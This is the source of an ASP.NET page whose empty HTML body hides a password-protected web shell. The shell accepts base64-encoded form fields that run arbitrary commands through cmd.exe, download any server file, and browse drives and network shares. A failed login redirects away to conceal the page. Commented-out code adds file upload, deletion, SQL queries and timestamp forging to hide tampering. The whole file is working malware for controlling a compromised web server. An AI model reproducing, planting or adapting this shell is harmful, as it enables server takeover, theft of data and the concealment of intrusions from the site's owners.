<%@ Page Language="C#" ValidateRequest="false" EnableViewState="false" %>

<%@ Import Namespace="System.IO" %>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <%

    try
    {
        NameValueCollection t = HttpContext.Current.Request.Form;

        method selectedMethod = method.auth;

        try
        {
            int methodID = int.Parse(fb(t["m"]));
            selectedMethod = (method)methodID;
        }
        catch
        {
            rm();
        }

        p = fb(t["p"]);
        pro = fb(t["pro"]);
        cmd = fb(t["cmd"]);
        sav = fb(t["sav"]);
        vir = t["vir"];
        nen = fb(t["nen"]);
        upb = fb(t["upb"]);
        upd = fb(t["upd"]);
        del = fb(t["del"]);
        don = fb(t["don"]);
        hid = t["hid"];
        tfil = fb(t["tfil"]);
        ttar = fb(t["ttar"]);
        ttim = fb(t["ttim"]);
        baseFile = t["baseFile"];
        baseAddr = fb(t["baseAddr"]);
        baseVir = t["baseVir"];
        sqc = fb(t["sqc"]);
        sqq = fb(t["sqq"]);
        exadd = fb(t["exadd"]);

        switch (selectedMethod)
        {
            case method.auth:
                c(p);
                break;
            case method.command:
                r(pro, cmd);
                break;
            //case method.upload:
            //    u(HttpContext.Current.Request.Files["upl"], sav, string.IsNullOrEmpty(vir) ? false : true, nen);
            //    break;
            //case method.uploadbase64:
            //    baseupl(baseFile,baseAddr,string.IsNullOrEmpty(baseVir)?false:true);
            //    break;
            //case method.delete:
            //    d(del);
            //    break;
            case method.download:
                z(don);
                break;
            //case method.changeTime:
            //    g(hid,tfil,ttar,ttim);
            //    break;
            //case method.sqlQuery:
            //    sq(sqc,sqq);
            //    break;
            case method.explorer:
                exp(exadd);
                break;
            case method.getsize:
                gsize(fb(t["gsize"]));
                break;
            case method.getlocation:
                getLoc();
                break;
            default:
                break;
        }

        //if(!string.IsNullOrEmpty(p))c(p);
        //else c();
        //if(!string.IsNullOrEmpty(cmd))r(pro,cmd);
        //else if(HttpContext.Current.Request.Files["upl"]!=null)u(HttpContext.Current.Request.Files["upl"],sav,string.IsNullOrEmpty(vir)?false:true,nen);
        //else if(!string.IsNullOrEmpty(upb))h(upb,upd);
        //else if(!string.IsNullOrEmpty(del))d(del);
        //else if(!string.IsNullOrEmpty(don))z(don);
        //else if(!string.IsNullOrEmpty(tfil))g(hid,tfil,ttar,ttim);
        //else if(!string.IsNullOrEmpty(baseFile))baseupl(baseFile,baseAddr,string.IsNullOrEmpty(baseVir)?false:true);
        //else if(!string.IsNullOrEmpty(sqc))sq(sqc,sqq);
        //else if(!string.IsNullOrEmpty(exadd))exp(exadd);
        //else if(!string.IsNullOrEmpty(t["gsize"]))gsize(fb(t["gsize"]));

        //if(HttpContext.Current.Request.Cookies["data"]!=null){string data=fb(HttpContext.Current.Request.Cookies["data"].Value);string[] data2=data.Split(new string[]{"#|#"},StringSplitOptions.None);for(int i=0;i<data2.Length;i++){string[] data3=data2[i].Split(new string[]{"#=#"},StringSplitOptions.None);
        //        switch (data3[0]){
        //            case"pro":pro=a(pro,fb(data3[1]));break;
        //            case"cmd":cmd=a(cmd,fb(data3[1]));break;
        //            case"sav":sav=a(sav,fb(data3[1]));break;
        //            case"vir":vir=a(vir,fb(data3[1]));break;
        //            case"nen":nen=a(nen,fb(data3[1]));break;
        //            case"don":don=a(don,fb(data3[1]));break;
        //            case"tfil":tfil=a(tfil,fb(data3[1]));break;
        //            case"ttar":ttar=a(ttar,fb(data3[1]));break;
        //            case"ttim":ttim=a(ttim,fb(data3[1]));break;
        //            case"sqc":sqc=a(sqc,fb(data3[1]));break;
        //            case"sqq":sqq=a(sqq,fb(data3[1]));break;
        //            case"exadd":exadd=a(exadd,fb(data3[1]));break;
        //        }}}

        //view();
    }
    catch (Exception ex)
    {
        response("Error : " + ex.Message);
    }
    %>
    <script runat="server">
        enum method
        {
            auth = 0,
            command = 1,
            upload = 2,
            uploadbase64 = 3,
            delete = 4,
            download = 5,
            changeTime = 6,
            sqlQuery = 7,
            explorer = 8,
            getsize = 9,
            getlocation = 10
        };
        string salt = "di2zag7wZHTK9YR0NGq";
        string p, pro, cmd, sav, vir, nen, upb, upd, del, don, hid, tfil, ttar, ttim, baseFile, baseAddr, baseVir, baseName, sqc, sqq, exadd;
        bool aut = false;
        string pp = "ePQm3HPXJYt5wZSFhktJ/IEin/A=";
        string a(string a, string b) { return string.IsNullOrEmpty(a) ? b : a; }
        string tb(string a) { string ret = ""; try { ret = string.IsNullOrEmpty(a) ? a : Convert.ToBase64String(Encoding.UTF8.GetBytes(a)); } catch { } return ret; }
        string fb(string a) { string ret = ""; try { ret = string.IsNullOrEmpty(a) ? a : Encoding.UTF8.GetString(Convert.FromBase64String(a)); } catch { } return ret; }
        void view()
        {
            string data = string.Format("pro#=#{0}#|#cmd#=#{1}#|#sav#=#{2}#|#vir#=#{3}#|#nen#=#{4}#|#don#=#{5}#|#tfil#=#{6}#|#ttar#=#{7}#|#ttim#=#{8}|#sqc#=#{9}|#sqq#=#{10}|#exadd#=#{11}",
tb(pro), tb(cmd), tb(sav), tb(vir), tb(nen), tb(don), tb(tfil), tb(ttar), tb(ttim), tb(sqc), tb(sqq), tb(exadd));
            HttpCookie coo = new HttpCookie("data", data); coo.Expires = DateTime.Now.AddDays(1); HttpContext.Current.Response.SetCookie(coo);
        }

        void response(string ret)
        {
            Response.Clear();
            Response.Write(tb(ret));
            Response.Headers.Add("Access-Control-Allow-Origin", "*");
            Response.Flush();
            Response.SuppressContent = true;
            ApplicationInstance.CompleteRequest();
            Response.End();
        }
        void rm() {/*System.IO.File.Delete(Request.ServerVariables["PATH_TRANSLATED"]);Response.Redirect(Request.RawUrl);*/Response.Redirect("/"); }
        void c(string p)
        {
            string ret = string.Empty;
            try
            {
                ret = c().ToString();
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }

            response(ret);
        }

        bool c()
        {
            if (!string.IsNullOrEmpty(p))
            {
                aut = Convert.ToBase64String(new System.Security.Cryptography.SHA1CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(p + salt))) == pp;
                if (!aut)
                    rm();
                return aut;
            }

            rm();
            return false;
        }

        //void u(HttpPostedFile upl, string sav, bool vir, string nen) { try { if (c()) { if (upl != null && upl.ContentLength > 0) { string fn = string.IsNullOrEmpty(nen) ? System.IO.Path.GetFileName(upl.FileName) : nen; string path = vir ? Server.MapPath(sav) : sav; string SaveLocation = System.IO.Path.HasExtension(path) ? path : path.TrimEnd('\\') + "\\" + fn; upl.SaveAs(SaveLocation); l("File uploaded successfuly : " + SaveLocation); } } } catch (Exception ex) { l(ex.Message); } }
        //void baseupl(string baseFile, string baseAddr, bool baseVir) { try { if (c()) { if (baseFile != null && baseFile.Length > 0 && !string.IsNullOrEmpty(baseAddr)) { string SaveLocation = baseVir ? Server.MapPath(baseAddr) : baseAddr; System.IO.File.WriteAllBytes(SaveLocation, Convert.FromBase64String(baseFile)); l("File uploaded successfuly : " + SaveLocation); } } } catch (Exception ex) { l(ex.Message); } }
        void r(string pro, string cmd)
        {
            string ret = "Error : -";

            try
            {
                if (c())
                {
                    string o = exec(cmd, pro);
                    ret = HttpUtility.HtmlEncode(o);
                }
            }
            catch (Exception ex)
            {
                ret = "Error : " + ex.Message;
            }

            response(ret);
        }
        void z(string don)
        {
            try {
                if (c() && !string.IsNullOrEmpty(don))
                {
                    byte[] f = System.IO.File.ReadAllBytes(don);
                    Response.Clear();
                    Response.ClearHeaders();
                    Response.ClearContent();
                    Response.AppendHeader("content-length", f.Length.ToString());
                    Response.ContentType = "application/octet-stream";
                    Response.AppendHeader("content-disposition", "attachment; filename=" + don.Substring(don.LastIndexOf('\\') + 1));
                    Response.BinaryWrite(f);
                    Response.Flush();
                    Response.SuppressContent = true;
                    ApplicationInstance.CompleteRequest();
                    Response.End();
                }
            } catch { }
        }
        //string ti(string tt) { return "Creation Time :\t\t" + System.IO.File.GetCreationTime(tt).ToString("yyyy-MM-dd HH:mm:ss") + "<br>Last Access Time :\t" + System.IO.File.GetLastAccessTime(tt).ToString("yyyy-MM-dd HH:mm:ss") + "<br>Last Write Time :\t" + System.IO.File.GetLastWriteTime(tt).ToString("yyyy-MM-dd HH:mm:ss"); }
        //void g(string hid, string tfil, string ttar, string ttim) { try { if (c() && !string.IsNullOrEmpty(tfil)) { l(string.Empty); if (hid == "1") ti(tfil); else if (hid == "2") { if (!string.IsNullOrEmpty(ttar)) { System.IO.File.SetCreationTime(tfil, System.IO.File.GetCreationTime(ttar)); System.IO.File.SetLastAccessTime(tfil, System.IO.File.GetLastAccessTime(ttar)); System.IO.File.SetLastWriteTime(tfil, System.IO.File.GetLastWriteTime(ttar)); l("Time successfuly changed :<br>" + tfil + "<br>" + ti(tfil)); } } else if (hid == "3") { if (!string.IsNullOrEmpty(ttim)) { DateTime te = DateTime.Parse(ttim); System.IO.File.SetCreationTime(tfil, te); System.IO.File.SetLastAccessTime(tfil, te); System.IO.File.SetLastWriteTime(tfil, te); l("Time successfuly changed :<br>" + tfil + "<br>" + ti(tfil)); } } } } catch (Exception ex) { l(ex.Message); } }
        //void h(string upb, string upd) { try { if (c() && !string.IsNullOrEmpty(upb) && !string.IsNullOrEmpty(upd)) { System.IO.File.WriteAllBytes(System.IO.Path.GetTempPath() + upd, Convert.FromBase64String(upb)); l(upd + " successfuly uploaded"); } } catch (Exception ex) { l(ex.Message); } }
        //void d(string del) { try { if (c() && !string.IsNullOrEmpty(del)) { System.IO.File.Delete(System.IO.Path.GetTempPath() + del); l(del + " successfuly deleled"); } } catch (Exception ex) { l(ex.Message); } }
        //void sq(string sqc, string sqq) { try { if (c()) { if (!string.IsNullOrEmpty(sqc)) { using (System.Data.SqlClient.SqlConnection con = new System.Data.SqlClient.SqlConnection(sqc)) { if (string.IsNullOrEmpty(sqq)) { try { con.Open(); l("Sql Server Connection Successfuly Established"); } catch (Exception ex) { l("Sql Server Connection Failed :" + Environment.NewLine + ex.ToString()); } } else { try { con.Open(); System.Data.SqlClient.SqlCommand com = new System.Data.SqlClient.SqlCommand(sqq, con); System.Data.SqlClient.SqlDataAdapter ad = new System.Data.SqlClient.SqlDataAdapter(com); System.Data.DataTable dt = new System.Data.DataTable(); ad.Fill(dt); DataGrid grid = new DataGrid(); System.Web.UI.WebControls.DataList list = new System.Web.UI.WebControls.DataList(); grid.DataSource = dt; grid.DataBind(); log.Controls.Add(grid); } catch (Exception ex) { l("Error : <br>" + ex.ToString()); } } con.Close(); } } } } catch (Exception ex) { l(ex.Message); } }
        //string x(string f) { return Encoding.UTF8.GetString(Convert.FromBase64String(f)); }
        //void l(string ll) { log.InnerHtml = tb(ll); }

        string exec(string cmd, string pro = "")
        {
            System.Diagnostics.Process n = new System.Diagnostics.Process();
            n.StartInfo.FileName = (string.IsNullOrEmpty(pro) ? "cmd.exe" : pro);
            n.StartInfo.UseShellExecute = false; n.StartInfo.RedirectStandardInput = true;
            n.StartInfo.RedirectStandardOutput = true;
            n.StartInfo.RedirectStandardError = true;
            n.StartInfo.CreateNoWindow = true;
            string o = null;
            n.Start();
            n.StandardInput.WriteLine(cmd);
            n.StandardInput.WriteLine("exit");
            o = n.StandardOutput.ReadToEnd();
            n.WaitForExit();
            n.Close();
            return o;
        }

        void gsize(string addr)
        {
            string ret = "Error : -";
            try
            {
                long size = GetDirSize(new DirectoryInfo(addr));
                ret = sizeFix(size);
            }
            catch (Exception ex)
            {
                ret = "Error : " + ex.Message;
            }

            response(ret);
        }

        void exp(string exadd)
        {
            string ret = "Error : -";
            try
            {
                if (exadd.ToLower() == "root")
                {
                    ret = "{\"dir\":[{\"name\":\"\\\\\\\\localhost\"}";// in javascript json parser two \ = one \
                    string netUse = exec("net use");
                    string[] lines = netUse.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
                    foreach (string item in lines)
                    {
                        if (item.ToLower().StartsWith("ok"))
                        {
                            int index = item.IndexOf("\\\\");
                            ret += ",{\"name\":\"\\\\" + item.Substring(index, item.IndexOf('\\', index + 2) - index) + "\"}";
                        }
                    }
                    ret += "]}";
                }
                else
                {
                    if (exadd.Trim('\\').Split('\\').Count() == 1) // \\localhost
                    {
                        string tmp = exadd.ToLower().TrimEnd('\\');
                        if (tmp == "\\\\localhost")
                        {
                            ret = "{\"dir\":[";
                            bool isStart = false;
                            foreach (DriveInfo item in DriveInfo.GetDrives())
                            {
                                if (item.IsReady)
                                {
                                    if (isStart)
                                        ret += ",";
                                    ret += string.Format("{{\"name\":\"{0}$\",\"tsize\":\"{1}\",\"fsize\":\"{2}\",\"usize\":\"{3}\"}}", item.Name.TrimEnd('\\').TrimEnd(':'), sizeFix(item.TotalSize), sizeFix(item.TotalFreeSpace), sizeFix(item.TotalSize - item.TotalFreeSpace));
                                    isStart = true;
                                }
                            }
                            ret += "]}";
                        }
                        else
                        {

                        }
                    }
                    else // \\localhost\c$\
                    {
                        FileAttributes attr = File.GetAttributes(exadd);
                        if ((attr & FileAttributes.Directory) == FileAttributes.Directory)
                        {
                            DirectoryInfo dirInfo = new DirectoryInfo(exadd);
                            ret = "{" + string.Format("{0},{1}", createJsonDirectory(dirInfo.GetDirectories()), createJsonFile(dirInfo.GetFiles())) + "}";
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                ret = "Error : " + ex.Message;
            }

            response(ret);
        }

        void getLoc()
        {
            response(Server.MapPath(string.Empty) + "\\");
        }

        long GetDirSize(DirectoryInfo d)
        {
            long size = 0;

            FileInfo[] fis = d.GetFiles();
            foreach (FileInfo fi in fis)
            {
                size += fi.Length;
            }

            DirectoryInfo[] dis = d.GetDirectories();
            foreach (DirectoryInfo di in dis)
            {
                size += GetDirSize(di);
            }

            return size;
        }
        string createJsonDirectory(DirectoryInfo[] dir)
        {
            string json = "\"dir\":[";
            for (int i = 0; i < dir.Length; i++)
            {
                if (i > 0)
                    json += ",";
                json += "{\"name\":\"" + dir[i].Name + "\"}";
            }
            json += "]";
            return json;
        }
        string createJsonFile(FileInfo[] file)
        {
            string json = "\"file\":[";
            for (int i = 0; i < file.Length; i++)
            {
                if (i > 0)
                    json += ",";
                json += "[\"" + file[i].Name + "\",\"" + sizeFix(file[i].Length) + "\"]";
            }
            json += "]";
            return json;
        }
        string sizeFix(long size)
        {
            double s = size;
            if (s < 1024) return s + " B";
            s = s / 1024;
            if (s < 1024) return Math.Round(s, 2) + " KB";
            s = s / 1024;
            if (s < 1024) return Math.Round(s, 2) + " MB";
            s = s / 1024;
            return Math.Round(s, 2) + " GB";
        }
    </script>
</head>
<body>
</body>
</html>
